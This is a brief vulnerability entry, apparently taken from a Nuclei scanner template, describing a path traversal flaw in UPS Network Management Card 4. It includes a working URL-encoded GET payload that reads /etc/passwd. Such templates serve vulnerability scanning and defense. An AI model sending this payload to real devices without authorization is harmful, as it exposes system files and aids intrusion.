# Vulnerability: UPS Network Management Card 4 Path Traversal
**Classification:** PACKETSTORM
**Source:** Nuclei Template (`ups-network-lfi.yaml`)

## Description
UPS Network Management Card version 4 suffers from a path traversal vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

